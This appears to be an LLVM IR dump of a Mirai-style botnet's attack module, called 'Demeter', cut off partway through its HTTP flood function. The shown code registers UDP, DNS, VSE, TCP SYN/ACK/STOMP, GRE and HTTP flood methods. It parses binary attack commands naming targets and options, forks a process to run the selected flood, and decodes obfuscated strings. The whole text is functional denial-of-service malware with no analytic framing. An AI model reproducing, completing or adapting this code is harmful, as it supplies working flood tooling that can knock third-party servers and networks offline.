; ModuleID = 'host/ir_O3/Demeter.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.attack_http_state = type { i32, i8, i32, i32, i32, [512 x i8], [257 x i8], [129 x i8], [513 x i8], [9 x i8], [9 x i8], i32, i32, i32, i32, i32, [5 x [128 x i8]], i32, [1024 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }

@methods_len = local_unnamed_addr global i8 0, align 1
@methods = local_unnamed_addr global %struct.attack_method** null, align 8
@attack_ongoing = local_unnamed_addr global [8 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common local_unnamed_addr global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"\0D\0AHost: \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Cookie: \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"; \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"url=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@table = common local_unnamed_addr global [63 x %struct.table_value] zeroinitializer, align 16
@table_key = local_unnamed_addr global i32 1043935, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() local_unnamed_addr #0 {
  tail call fastcc void @add_attack(i8 zeroext 0, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_generic)
  tail call fastcc void @add_attack(i8 zeroext 1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_vse)
  tail call fastcc void @add_attack(i8 zeroext 2, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_dns)
  tail call fastcc void @add_attack(i8 zeroext 8, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_plain)
  tail call fastcc void @add_attack(i8 zeroext 3, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_tcp_syn)
  tail call fastcc void @add_attack(i8 zeroext 4, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_tcp_ack)
  tail call fastcc void @add_attack(i8 zeroext 5, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_tcp_stomp)
  tail call fastcc void @add_attack(i8 zeroext 6, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_gre_ip)
  tail call fastcc void @add_attack(i8 zeroext 7, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_gre_eth)
  tail call fastcc void @add_attack(i8 zeroext 9, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* bitcast (void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_app_http to void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*))
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @add_attack(i8 zeroext, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*) unnamed_addr #0 {
  %3 = tail call noalias i8* @calloc(i64 1, i64 16) #10
  %4 = getelementptr inbounds i8, i8* %3, i64 8
  store i8 %0, i8* %4, align 8
  %5 = bitcast i8* %3 to void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)**
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %5, align 8
  %6 = load i8*, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %7 = load i8, i8* @methods_len, align 1
  %8 = zext i8 %7 to i64
  %9 = shl nuw nsw i64 %8, 3
  %10 = add nuw nsw i64 %9, 8
  %11 = tail call i8* @realloc(i8* %6, i64 %10) #10
  %12 = bitcast i8* %11 to %struct.attack_method**
  store i8* %11, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %13 = load i8, i8* @methods_len, align 1
  %14 = add i8 %13, 1
  store i8 %14, i8* @methods_len, align 1
  %15 = zext i8 %13 to i64
  %16 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %12, i64 %15
  %17 = bitcast %struct.attack_method** %16 to i8**
  store i8* %3, i8** %17, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) local_unnamed_addr #1

; Function Attrs: nounwind
declare noalias i8* @realloc(i8* nocapture, i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8* nocapture readonly, i32) local_unnamed_addr #0 {
  %3 = icmp ult i32 %1, 4
  br i1 %3, label %.thread80, label %4

; <label>:4:                                      ; preds = %2
  %5 = bitcast i8* %0 to i32*
  %6 = load i32, i32* %5, align 4
  %7 = tail call i32 @ntohl(i32 %6) #11
  %8 = icmp eq i32 %1, 4
  br i1 %8, label %.thread80, label %9

; <label>:9:                                      ; preds = %4
  %10 = getelementptr inbounds i8, i8* %0, i64 4
  %11 = load i8, i8* %10, align 1
  %12 = icmp eq i32 %1, 5
  br i1 %12, label %.thread80, label %13

; <label>:13:                                     ; preds = %9
  %14 = getelementptr inbounds i8, i8* %0, i64 5
  %15 = getelementptr inbounds i8, i8* %0, i64 6
  %16 = load i8, i8* %14, align 1
  %17 = add i32 %1, -6
  %18 = zext i8 %16 to i32
  %19 = icmp eq i8 %16, 0
  br i1 %19, label %.thread80, label %20

; <label>:20:                                     ; preds = %13
  %21 = sext i32 %17 to i64
  %22 = zext i8 %16 to i64
  %23 = mul nuw nsw i64 %22, 5
  %24 = icmp ult i64 %21, %23
  br i1 %24, label %.thread80, label %.lr.ph88.preheader

.lr.ph88.preheader:                               ; preds = %20
  %25 = tail call noalias i8* @calloc(i64 %22, i64 24) #10
  %26 = bitcast i8* %25 to %struct.attack_target*
  %27 = add nsw i32 %18, -1
  %28 = zext i32 %27 to i64
  %29 = mul nuw nsw i64 %28, 5
  %30 = add nuw nsw i64 %29, 11
  %scevgep = getelementptr i8, i8* %0, i64 %30
  %wide.trip.count = zext i8 %16 to i64
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph88.prol.loopexit, label %.lr.ph88.prol.preheader

.lr.ph88.prol.preheader:                          ; preds = %.lr.ph88.preheader
  br label %.lr.ph88.prol

.lr.ph88.prol:                                    ; preds = %.lr.ph88.prol.preheader
  %31 = bitcast i8* %15 to i32*
  %32 = load i32, i32* %31, align 4
  %33 = getelementptr inbounds i8, i8* %25, i64 16
  %34 = bitcast i8* %33 to i32*
  store i32 %32, i32* %34, align 4
  %35 = getelementptr inbounds i8, i8* %0, i64 10
  %36 = getelementptr inbounds i8, i8* %0, i64 11
  %37 = load i8, i8* %35, align 1
  %38 = getelementptr inbounds i8, i8* %25, i64 20
  store i8 %37, i8* %38, align 4
  %39 = bitcast i8* %25 to i16*
  store i16 2, i16* %39, align 4
  %40 = getelementptr inbounds i8, i8* %25, i64 4
  %41 = bitcast i8* %40 to i32*
  store i32 %32, i32* %41, align 4
  br label %.lr.ph88.prol.loopexit

.lr.ph88.prol.loopexit:                           ; preds = %.lr.ph88.preheader, %.lr.ph88.prol
  %indvars.iv91.unr = phi i64 [ 0, %.lr.ph88.preheader ], [ 1, %.lr.ph88.prol ]
  %.087.unr = phi i8* [ %15, %.lr.ph88.preheader ], [ %36, %.lr.ph88.prol ]
  %42 = icmp eq i8 %16, 1
  br i1 %42, label %._crit_edge, label %.lr.ph88.preheader.new

.lr.ph88.preheader.new:                           ; preds = %.lr.ph88.prol.loopexit
  br label %.lr.ph88

.lr.ph88:                                         ; preds = %.lr.ph88, %.lr.ph88.preheader.new
  %indvars.iv91 = phi i64 [ %indvars.iv91.unr, %.lr.ph88.preheader.new ], [ %indvars.iv.next92.1, %.lr.ph88 ]
  %.087 = phi i8* [ %.087.unr, %.lr.ph88.preheader.new ], [ %56, %.lr.ph88 ]
  %43 = bitcast i8* %.087 to i32*
  %44 = load i32, i32* %43, align 4
  %45 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 1
  store i32 %44, i32* %45, align 4
  %46 = getelementptr inbounds i8, i8* %.087, i64 4
  %47 = getelementptr inbounds i8, i8* %.087, i64 5
  %48 = load i8, i8* %46, align 1
  %49 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 2
  store i8 %48, i8* %49, align 4
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 0
  store i16 2, i16* %50, align 4
  %51 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 2, i32 0
  store i32 %44, i32* %51, align 4
  %indvars.iv.next92 = add nuw nsw i64 %indvars.iv91, 1
  %52 = bitcast i8* %47 to i32*
  %53 = load i32, i32* %52, align 4
  %54 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 1
  store i32 %53, i32* %54, align 4
  %55 = getelementptr inbounds i8, i8* %.087, i64 9
  %56 = getelementptr inbounds i8, i8* %.087, i64 10
  %57 = load i8, i8* %55, align 1
  %58 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 2
  store i8 %57, i8* %58, align 4
  %59 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 0
  store i16 2, i16* %59, align 4
  %60 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 2, i32 0
  store i32 %53, i32* %60, align 4
  %indvars.iv.next92.1 = add nsw i64 %indvars.iv91, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next92.1, %wide.trip.count
  br i1 %exitcond.1, label %._crit_edge.unr-lcssa, label %.lr.ph88

._crit_edge.unr-lcssa:                            ; preds = %.lr.ph88
  br label %._crit_edge

._crit_edge:                                      ; preds = %.lr.ph88.prol.loopexit, %._crit_edge.unr-lcssa
  %61 = mul nsw i32 %18, -5
  %62 = add i32 %17, %61
  %63 = icmp eq i32 %62, 0
  br i1 %63, label %.loopexit81.thread, label %64

; <label>:64:                                     ; preds = %._crit_edge
  %65 = load i8, i8* %scevgep, align 1
  %66 = icmp eq i8 %65, 0
  br i1 %66, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %64
  %67 = zext i8 %65 to i64
  %68 = tail call noalias i8* @calloc(i64 %67, i64 16) #10
  %69 = bitcast i8* %68 to %struct.attack_option*
  %70 = getelementptr inbounds i8, i8* %scevgep, i64 1
  %71 = add i32 %62, -1
  %72 = zext i8 %65 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %85
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %85 ]
  %.184 = phi i8* [ %70, %.lr.ph.preheader ], [ %91, %85 ]
  %.17583 = phi i32 [ %71, %.lr.ph.preheader ], [ %92, %85 ]
  %73 = icmp eq i32 %.17583, 0
  br i1 %73, label %.loopexit81.loopexit, label %74

; <label>:74:                                     ; preds = %.lr.ph
  %75 = load i8, i8* %.184, align 1
  %76 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %69, i64 %indvars.iv, i32 1
  store i8 %75, i8* %76, align 8
  %77 = icmp eq i32 %.17583, 1
  br i1 %77, label %.loopexit81.loopexit, label %78

; <label>:78:                                     ; preds = %74
  %79 = getelementptr inbounds i8, i8* %.184, i64 1
  %80 = getelementptr inbounds i8, i8* %.184, i64 2
  %81 = load i8, i8* %79, align 1
  %82 = add i32 %.17583, -2
  %83 = zext i8 %81 to i32
  %84 = icmp slt i32 %82, %83
  br i1 %84, label %.loopexit81.loopexit, label %85

; <label>:85:                                     ; preds = %78
  %86 = add nuw nsw i32 %83, 1
  %87 = zext i32 %86 to i64
  %88 = tail call noalias i8* @calloc(i64 %87, i64 1) #10
  %89 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %69, i64 %indvars.iv, i32 0
  store i8* %88, i8** %89, align 8
  tail call void @util_memcpy(i8* %88, i8* %80, i32 %83)
  %90 = zext i8 %81 to i64
  %91 = getelementptr inbounds i8, i8* %80, i64 %90
  %92 = sub nsw i32 %82, %83
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %93 = icmp slt i64 %indvars.iv.next, %72
  br i1 %93, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %85
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %64
  %.070 = phi %struct.attack_option* [ null, %64 ], [ %69, %.loopexit.loopexit ]
  %94 = tail call i32* @__errno_location() #11
  store i32 0, i32* %94, align 4
  tail call void @attack_start(i32 %7, i8 zeroext %11, i8 zeroext %16, %struct.attack_target* %26, i8 zeroext %65, %struct.attack_option* %.070)
  br label %.loopexit81

.loopexit81.loopexit:                             ; preds = %.lr.ph, %74, %78
  br label %.loopexit81

.loopexit81:                                      ; preds = %.loopexit81.loopexit, %.loopexit
  %.171 = phi %struct.attack_option* [ %.070, %.loopexit ], [ %69, %.loopexit81.loopexit ]
  %95 = icmp eq i8* %25, null
  br i1 %95, label %96, label %.loopexit81.thread

.loopexit81.thread:                               ; preds = %._crit_edge, %.loopexit81
  %.17195 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ null, %._crit_edge ]
  %.07393 = phi i8 [ %65, %.loopexit81 ], [ undef, %._crit_edge ]
  tail call void @free(i8* nonnull %25) #10
  br label %96

; <label>:96:                                     ; preds = %.loopexit81, %.loopexit81.thread
  %.17196 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ %.17195, %.loopexit81.thread ]
  %.07394 = phi i8 [ %65, %.loopexit81 ], [ %.07393, %.loopexit81.thread ]
  %97 = icmp eq %struct.attack_option* %.17196, null
  br i1 %97, label %.thread80, label %98

; <label>:98:                                     ; preds = %96
  %99 = zext i8 %.07394 to i32
  tail call fastcc void @free_opts(%struct.attack_option* nonnull %.17196, i32 %99)
  br label %.thread80

.thread80:                                        ; preds = %2, %4, %9, %13, %20, %96, %98
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) local_unnamed_addr #0 {
  %7 = tail call i32 @fork() #10
  %8 = icmp sgt i32 %7, 0
  %9 = icmp eq i32 %7, -1
  %or.cond = or i1 %8, %9
  br i1 %or.cond, label %14, label %.preheader

.preheader:                                       ; preds = %6
  %10 = load i8, i8* @methods_len, align 1
  %11 = icmp eq i8 %10, 0
  br i1 %11, label %.loopexit, label %.lr.ph

.lr.ph:                                           ; preds = %.preheader
  %12 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %13 = zext i8 %10 to i64
  br label %17

; <label>:14:                                     ; preds = %6
  ret void

; <label>:15:                                     ; preds = %17
  %16 = icmp slt i64 %indvars.iv.next, %13
  br i1 %16, label %17, label %.loopexit.loopexit

; <label>:17:                                     ; preds = %.lr.ph, %15
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %15 ]
  %18 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %12, i64 %indvars.iv
  %19 = load %struct.attack_method*, %struct.attack_method** %18, align 8
  %20 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %19, i64 0, i32 1
  %21 = load i8, i8* %20, align 8
  %22 = icmp eq i8 %21, %1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %22, label %23, label %15

; <label>:23:                                     ; preds = %17
  %24 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %19, i64 0, i32 0
  %25 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %24, align 8
  tail call void %25(i32 %0, i8 zeroext %2, %struct.attack_target* %3, i8 zeroext %4, %struct.attack_option* %5) #10
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %15
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %23
  tail call void @exit(i32 0) #12
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @free_opts(%struct.attack_option*, i32) unnamed_addr #0 {
  %3 = icmp eq %struct.attack_option* %0, null
  br i1 %3, label %11, label %.preheader

.preheader:                                       ; preds = %2
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %9
  %indvars.iv = phi i64 [ %indvars.iv.next, %9 ], [ 0, %.lr.ph.preheader ]
  %5 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %0, i64 %indvars.iv, i32 0
  %6 = load i8*, i8** %5, align 8
  %7 = icmp eq i8* %6, null
  br i1 %7, label %9, label %8

; <label>:8:                                      ; preds = %.lr.ph
  tail call void @free(i8* nonnull %6) #10
  br label %9

; <label>:9:                                      ; preds = %.lr.ph, %8
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %9
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %10 = bitcast %struct.attack_option* %0 to i8*
  tail call void @free(i8* %10) #10
  br label %11

; <label>:11:                                     ; preds = %2, %._crit_edge
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #3

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i8* readnone) local_unnamed_addr #4 {
  %5 = icmp eq i8 %0, 0
  br i1 %5, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %4
  %6 = zext i8 %0 to i64
  br label %.lr.ph

; <label>:7:                                      ; preds = %.lr.ph
  %8 = icmp slt i64 %indvars.iv.next, %6
  br i1 %8, label %.lr.ph, label %.loopexit.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %7
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %7 ]
  %9 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 1
  %10 = load i8, i8* %9, align 8
  %11 = icmp eq i8 %10, %2
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %11, label %12, label %7

; <label>:12:                                     ; preds = %.lr.ph
  %13 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 0
  %14 = load i8*, i8** %13, align 8
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %7
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4, %12
  %.09 = phi i8* [ %14, %12 ], [ %3, %4 ], [ %3, %.loopexit.loopexit ]
  ret i8* %.09
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #4 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @util_atoi(i8* nonnull %5, i32 10)
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #0 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @inet_addr(i8* nonnull %5) #10
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_app_http(i8 zeroext, %struct.attack_target* nocapture readonly, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca [10241 x i8], align 16
  %7 = alloca %struct.fd_set, align 8
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %9 to %struct.timeval*
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca [10240 x i8], align 16
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 20, i8* null)
  %15 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 19, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0))
  %16 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 8, i8* null)
  %17 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 21, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 23, i32 1)
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 80)
  %20 = trunc i32 %19 to i16
  %21 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %21, i8 0, i64 10241, i32 16, i1 false)
  %22 = icmp eq i8* %16, null
  %23 = icmp eq i8* %17, null
  %or.cond = or i1 %22, %23
  br i1 %or.cond, label %973, label %24

; <label>:24:                                     ; preds = %4
  %25 = tail call i32 @util_strlen(i8* %17)
  %26 = icmp sgt i32 %25, 255
  br i1 %26, label %973, label %27

; <label>:27:                                     ; preds = %24
  %28 = tail call i32 @util_strlen(i8* %16)
  %29 = icmp sgt i32 %28, 127
  br i1 %29, label %973, label %30

; <label>:30:                                     ; preds = %27
  %31 = tail call i32 @util_strlen(i8* %15)
  %32 = icmp sgt i32 %31, 9
  br i1 %32, label %973, label %.preheader603

.preheader603:                                    ; preds = %30
  store i32 0, i32* %5, align 4
  %33 = icmp sgt i32 %31, 0
  br i1 %33, label %.lr.ph649.preheader, label %._crit_edge650

.lr.ph649.preheader:                              ; preds = %.preheader603
  br label %.lr.ph649

.lr.ph649:                                        ; preds = %.lr.ph649.preheader, %40
  %storemerge648 = phi i32 [ %42, %40 ], [ 0, %.lr.ph649.preheader ]
  %34 = sext i32 %storemerge648 to i64
  %35 = getelementptr inbounds i8, i8* %15, i64 %34
  %36 = load i8, i8* %35, align 1
  %.off592 = add i8 %36, -97
  %37 = icmp ult i8 %.off592, 26
  br i1 %37, label %38, label %40

; <label>:38:                                     ; preds = %.lr.ph649
  %39 = add i8 %36, -32
  store i8 %39, i8* %35, align 1
  %.pre = load i32, i32* %5, align 4
  br label %40

; <label>:40:                                     ; preds = %.lr.ph649, %38
  %41 = phi i32 [ %storemerge648, %.lr.ph649 ], [ %.pre, %38 ]
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %5, align 4
  %43 = tail call i32 @util_strlen(i8* nonnull %15)
  %44 = icmp slt i32 %42, %43
  br i1 %44, label %.lr.ph649, label %._crit_edge650.loopexit

._crit_edge650.loopexit:                          ; preds = %40
  br label %._crit_edge650

._crit_edge650:                                   ; preds = %._crit_edge650.loopexit, %.preheader603
  %45 = icmp slt i32 %18, 512
  %. = select i1 %45, i32 %18, i32 512
  tail call void @table_unlock_val(i8 zeroext 43)
  tail call void @table_unlock_val(i8 zeroext 44)
  tail call void @table_unlock_val(i8 zeroext 45)
  tail call void @table_unlock_val(i8 zeroext 46)
  tail call void @table_unlock_val(i8 zeroext 47)
  tail call void @table_unlock_val(i8 zeroext 48)
  tail call void @table_unlock_val(i8 zeroext 49)
  tail call void @table_unlock_val(i8 zeroext 50)
  tail call void @table_unlock_val(i8 zeroext 51)
  tail call void @table_unlock_val(i8 zeroext 52)
  tail call void @table_unlock_val(i8 zeroext 53)
  %46 = sext i32 %. to i64
  %47 = tail call noalias i8* @calloc(i64 %46, i64 3140) #10
  %48 = bitcast i8* %47 to %struct.attack_http_state*
  %49 = icmp sgt i32 %18, 0
  br i1 %49, label %.lr.ph647, label %.preheader601

.lr.ph647:                                        ; preds = %._crit_edge650
  %50 = zext i8 %0 to i32
  br label %62

.preheader601.loopexit:                           ; preds = %93
  br label %.preheader601

.preheader601:                                    ; preds = %.preheader601.loopexit, %._crit_edge650
  %51 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 0
  %52 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 0
  %53 = bitcast %struct.sockaddr_in* %10 to i8*
  %54 = bitcast i32* %5 to i8*
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i64 0, i32 0
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i64 0, i32 2, i32 0
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i64 0, i32 1
  %58 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %59 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 0
  %60 = icmp ne i8* %14, null
  %61 = bitcast i32* %12 to i8*
  %.not = icmp slt i32 %18, 1
  br label %.backedge602

; <label>:62:                                     ; preds = %.lr.ph647, %93
  %indvars.iv678 = phi i64 [ 0, %.lr.ph647 ], [ %indvars.iv.next679, %93 ]
  %63 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv678, i32 1
  store i8 0, i8* %63, align 4
  %64 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv678, i32 0
  store i32 -1, i32* %64, align 4
  %65 = trunc i64 %indvars.iv678 to i32
  %66 = srem i32 %65, %50
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %67, i32 1
  %69 = load i32, i32* %68, align 4
  %70 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv678, i32 4
  store i32 %69, i32* %70, align 4
  %71 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv678, i32 6, i64 0
  %72 = tail call i32 @util_strcpy(i8* %71, i8* %17)
  %73 = load i8, i8* %71, align 4
  %74 = icmp eq i8 %73, 47
  br i1 %74, label %79, label %75

; <label>:75:                                     ; preds = %62
  %76 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv678, i32 6, i64 1
  %77 = tail call i32 @util_strlen(i8* %71)
  %78 = sext i32 %77 to i64
  tail call void @llvm.memmove.p0i8.p0i8.i64(i8* %76, i8* %71, i64 %78, i32 1, i1 false)
  store i8 47, i8* %71, align 4
  br label %79

; <label>:79:                                     ; preds = %62, %75
  %80 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv678, i32 10, i64 0
  %81 = tail call i32 @util_strcpy(i8* %80, i8* %15)
  %82 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv678, i32 9, i64 0
  %83 = tail call i32 @util_strcpy(i8* %82, i8* %15)
